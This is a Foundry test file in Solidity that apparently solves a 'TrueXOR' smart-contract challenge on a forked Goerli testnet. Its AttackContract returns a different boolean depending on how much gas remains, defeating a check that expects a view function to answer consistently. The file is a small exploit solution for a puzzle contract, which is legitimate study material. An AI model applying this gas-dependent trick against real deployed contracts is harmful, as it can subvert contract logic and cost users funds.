// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/TrueXOR.sol";

contract TrueXORTest is Test {
    // the identifiers of the forks
    uint256 goerliFork;

    //Access variables from .env file via vm.envString("varname")
    //Replace ALCHEMY_KEY by your alchemy key or Etherscan key, change RPC url if need
    //inside your .env file e.g:
    string GOERLI_RPC_URL = vm.envString("GOERLI_RPC_URL");

    TrueXOR xor;
    AttackContract attack;

    address owner = makeAddr("OWNER");

    function setUp() external {
        vm.createSelectFork(GOERLI_RPC_URL);
        xor = new TrueXOR();
        attack = new AttackContract();
    }

    function test_callMe() external {
        vm.prank(address(msg.sender));
        xor.callMe{ gas: 10000 }(address(attack));
    }
}

contract AttackContract is IBoolGiver {
    uint256 gas = 6500;
    function giveBool() external view returns(bool) {
        return gas <= gasleft();
    }
}